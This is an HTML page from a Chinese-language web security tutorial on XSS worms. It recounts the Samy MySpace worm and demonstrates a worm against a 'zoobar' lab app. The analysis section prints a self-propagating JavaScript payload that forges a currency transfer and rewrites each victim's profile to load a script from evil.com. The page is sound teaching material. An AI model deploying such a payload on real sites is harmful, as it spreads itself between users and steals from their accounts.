@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        
+        <link rel="shortcut icon" href="../../../img/favicon.ico">
+       <title>XSS Worm - Web Security - Web Security</title>
+
+        <link href="../../../css/bootstrap-custom.min.css" rel="stylesheet">
+        <link href="../../../css/font-awesome-4.0.3.css" rel="stylesheet">
+        <link rel="stylesheet" href="../../../css/highlight.css">
+        <link href="../../../css/base.css" rel="stylesheet">
+        <link href="../../../css/extra.css" rel="stylesheet">
+
+        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+            <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+        <![endif]-->
+
+        
+    </head>
+
+    <body>
+
+        <div class="navbar navbar-default navbar-fixed-top" role="navigation">
+    <div class="container">
+
+        <!-- Collapsed navigation -->
+        <div class="navbar-header">
+            <!-- Expander button -->
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+
+            <!-- Main title -->
+            <a class="navbar-brand" href="../../..">Web Security</a>
+        </div>
+
+        <!-- Expanded navigation -->
+        <div class="navbar-collapse collapse">
+            <!-- Main navigation -->
+            <ul class="nav navbar-nav">
+            
+            
+                <li class="dropdown active">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">XSS <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                    
+                        <li >
+                            <a href="../Overview">XSS</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../XSS-Cookie">Stealing Cookie With XSS</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../CSS-history-hack">CSS History Hack</a>
+                        </li>
+                    
+                        <li class="active">
+                            <a href=".">XSS Worm</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../XSS-Defense">XSS Defense</a>
+                        </li>
+                    
+                    </ul>
+                </li>
+            
+            
+            
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">Browser Security <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                    
+                        <li >
+                            <a href="../../Browser_Security/Same-Origin-Policy">Same Origin Policy</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Browser_Security/Browser-Sandbox">Browser Sandbox</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Browser_Security/Malicious-URL-interception">Malicious URL interception</a>
+                        </li>
+                    
+                    </ul>
+                </li>
+            
+            
+            
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">Web服务配置安全 <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                    
+                        <li >
+                            <a href="../../Web_Server_Sercurity/Web-Server-Sercurity">Web Server Sercurity</a>
+                        </li>
+                    
+                    </ul>
+                </li>
+            
+            
+            
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">SQL_injection <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                    
+                        <li >
+                            <a href="../../SQL_injection/Overview">Overview</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../SQL_injection/SQL_injection">SQL_injection</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../SQL_injection/SQL_injection_defence">SQL_injection defence</a>
+                        </li>
+                    
+                    </ul>
+                </li>
+            
+            
+            
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">Clickjacking <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                    
+                        <li >
+                            <a href="../../Clickjacking/Overview">Overview</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Clickjacking/Click_Jacking">Click_Jacking</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Clickjacking/Click_Jacking_defence">Click Jacking defence</a>
+                        </li>
+                    
+                    </ul>
+                </li>
+            
+            
+            
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">CSRF <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                    
+                        <li >
+                            <a href="../../CSRF/Overview">CSRF</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../CSRF/CSRF_Attack">CSRF Attack</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../CSRF/CSRF_Defense">CSRF Defense</a>
+                        </li>
+                    
+                    </ul>
+                </li>
+            
+            
+            
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">Web框架安全 <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                    
+                        <li >
+                            <a href="../../Web_framework/Overview">Web框架安全概述</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Web_framework/XSS">模板引擎与XSS防御</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Web_framework/csrf">Web框架与CSRF防御</a>
+                        </li>
+                    
+                    </ul>
+                </li>
+            
+            
+            
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">拒绝服务攻击 <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                    
+                        <li >
+                            <a href="../../DOS/Overviewed">DOS攻击原理</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../DOS/general-dos">通用的DoS攻击技术</a>
+                        </li>
+                    
+                    </ul>
+                </li>
+            
+            
+            
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">Access_Control <b class="caret"></b></a>
+                    <ul class="dropdown-menu">
+                    
+                        <li >
+                            <a href="../../Access_Control/Overview">Access_Control</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Access_Control/DAC">DAC</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Access_Control/MAC">MAC</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Access_Control/RBAC">RBAC</a>
+                        </li>
+                    
+                        <li >
+                            <a href="../../Access_Control/Perform">Perform</a>
+                        </li>
+                    
+                    </ul>
+                </li>
+            
+            
+            </ul>
+
+            <!-- Search, Navigation and Repo links -->
+            <!--
+            <ul class="nav navbar-nav navbar-right">
+                <li >
+                    <a rel="next" href="../CSS-history-hack">
+                        <i class="fa fa-arrow-left"></i> Previous
+                    </a>
+                </li>
+                <li >
+                    <a rel="prev" href="../XSS-Defense">
+                        Next <i class="fa fa-arrow-right"></i>
+                    </a>
+                </li>
+                
+                <li>
+                    <a href="https://github.com/acgotaku/WebSecurity">
+                        
+                            <i class="fa fa-github"></i>
+                        
+                        GitHub
+                    </a>
+                </li>
+                
+            </ul>
+            -->
+        </div>
+    </div>
+</div>
+
+        <div class="container">
+            <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
+    <ul class="nav bs-sidenav">
+    
+        <li class="main active"><a href="#xss-worm">XSS Worm</a></li>
+        
+            <li><a href="#xss-worm_1">历史上第一次XSS Worm</a></li>
+        
+            <li><a href="#xss-worm_2">XSS Worm攻击原理</a></li>
+        
+            <li><a href="#xss-worm_3">XSS Worm 感染演示</a></li>
+        
+            <li><a href="#xss-worm_4">XSS Worm攻击代码分析</a></li>
+        
+            <li><a href="#_1">参考</a></li>
+        
+    
+    </ul>
+</div></div>
+            <div class="col-md-9" role="main"><h1 id="xss-worm">XSS Worm</h1>
+<p>XSS蠕虫不仅可以攻击用户而且还可以大规模感染</p>
+<hr />
+<h2 id="xss-worm_1">历史上第一次XSS Worm</h2>
+<p>2005年10月4日，世界上第一只“Web 2.0蠕虫”诞生了。当时有人在国外著名社交网络MySpace上写了一段 JavaScript 蠕虫代码，利用 Ajax 方法让无数的用户在
+毫不知情的情况下把作者加入了好友名单，同时在他们的个人简介里自动加上了 “samy is my hero” 的字样。</p>
+<p>当时19岁的 Samy 是蠕虫编写者，编写蠕虫的原因是为了跟女友打赌他可以在 MySpace 上拥有众多的粉丝，可是又达不到要求，于是，他稍微研究了一下 MySpace的
+安全性，并发现网站的个人简介处存在XSS漏洞。随后， Samy 在自己的个人简介中写入了一段 JavaScript 代码，每个查看他简介的人会在不知不觉中执行这段代码，
+接着该蠕虫会打开受害者的个人简介，把恶意的 JavaScript 代码片段复制进去。同样，任何查看受害者个人简介的人也会被感染，藉此 Samy XSS Worm 在 MySpace
+上疯散播，一天内就感染了超过100万用户。由于极其惊人的传播速度，最终导致 MySpace 服务器崩溃。</p>
+<p>下面是 Samy 的截图：</p>
+<p><img alt="Firest XSS Worm" src="../../../img/xss-worm-1.jpg" /></p>
+<p>可以看到有919664页用户的好友请求，这就是XSS Worm爆发的“战果”。</p>
+<p>所谓的跨站脚本蠕虫（XSS Worm），实质上是一段脚本程序，通常用 JavaScript或 VbScript 写成，在用户浏览XSS页面的时被激活。蠕虫利用
+站点页面的 XSS 漏洞根据其特定规则进行传播和感染。</p>
+<p>值得注意的是，XSS蠕虫只是 Web 2.0 蠕虫的其中一种，也是最广为人知的一种，它利用网络的XSS漏洞进行散播。Web 2.0 蠕虫还有其他形式，如 CSRF Worm，
+顾名思义，该类蠕虫是利用网站的 CSRF 漏洞进行攻击。</p>
+<h2 id="xss-worm_2">XSS Worm攻击原理</h2>
+<p>XSS蠕虫通常使用了大量的 <a href="https://developer.mozilla.org/en/docs/AJAX">Ajax</a> 技术。Ajax 的作用就在于：无须刷新即可异步传输数据，经过服务器
+处理后，得到返回信息，再提示给用户。如此一来，使跨站蠕虫具有较强的传播性和隐蔽性，而且蔓延速度相当惊人，呈几何级发展。</p>
+<p>一个完整的 XSS Worm的攻击流程如下。</p>
+<ol>
+<li>攻击者发现目标网站存在XSS漏洞，并且可以编写 XSS 蠕虫。</li>
+<li>利用宿主 （如博客空间） 作为传播源头进行 XSS 攻击。</li>
+<li>当其他用户访问被感染的空间时，XSS 蠕虫就继续感染。</li>
+</ol>
+<h2 id="xss-worm_3">XSS Worm 感染演示</h2>
+<p>首先，作为宿主本身要作为源头进行XSS攻击。用户名为 wang,Balance为 20 zoobars。
+每个注册用户都会默认分配10个 zoobars，用户可以将其自由转移给其他人。</p>
+<p><img alt="XSS Worm code" src="../../../img/xss-worm-2.png" /></p>
+<p>我们在Profile里面写入了恶意代码，只要别人查看就会被感染，接下来让我们注册个新用户 worm1:</p>
+<p><img alt="XSS Worm1" src="../../../img/xss-worm-3.png" /></p>
+<p>可以看到默认拥有10个zoobars，并且profile为空的。接下来让我们查看一下宿主用户wang：</p>
+<p><img alt="XSS Worm1 view" src="../../../img/xss-worm-4.png" /></p>
+<p>这时查看到了wang的Balance为 20 zoobars，同时恶意代码得到了执行，让我们查看 worm1的profile：</p>
+<p><img alt="XSS Worm1 attack" src="../../../img/xss-worm-5.png" /></p>
+<p>可以发现 worm1用户的profile已经被感染，同时zoobars也被偷取了一个。返回查看可以发现wang的zoobars添加了一个。</p>
+<h2 id="xss-worm_4">XSS Worm攻击代码分析</h2>
+<p>下面是 evil.js的代码内容：</p>
+<pre><code>    var http = new XMLHttpRequest();
+    http.open("POST", "http://myzoo.com/transfer.php", true);
+    http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+    http.send("zoobars=1&amp;recipient=wang&amp;submission=Send");
+    var http = new XMLHttpRequest();
+    http.open("POST", "http://myzoo.com/index.php", true);
+    http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+    var data="profile_update=%3Cscript%3E%0D%0A+%0D%0A+var+script+%3Ddocument.createElement%28%22script%22%29%3B%0D%0A+script.setAttribute%28%22src%22%2C%22http%3A%2F%2Fevil.com%2Fevil.js%22%29%3B%0D%0A+document.body.appendChild%28script%29%3B%0D%0A%3C%2Fscript%3E&amp;profile_submit=Save";
+    http.send(data);
+</code></pre>
+<p>代码本质上就是模拟用户请求发送转移zoobars的合法请求，然后修改用户的Profile，使得用户也被感染恶意代码。</p>
+<h2 id="_1">参考</h2>
+<p><a href="https://www.whitehatsec.com/assets/WP5CSS0607.pdf">Cross-Site Scripting Worms &amp; Viruses</a></p>
+<p><a href="http://namb.la/popular/tech.html">Technical explanation of The MySpace Worm</a></p>
+</div>
+        </div>
+        <footer class="footer col-md-12">
+            <hr>
+            
+                <p>Copyright &copy; 2015, <a href="https://github.com/acgotaku/WebSecurity">CSS WebSecurity</a>.</p>
+            
+        </footer>
+
+        <script src="../../../js/jquery-1.10.2.min.js"></script>
+        <script src="../../../js/bootstrap-3.0.3.min.js"></script>
+        <script src="../../../js/highlight.pack.js"></script>
+        <script src="../../../js/base.js"></script>
+    </body>
+</html>
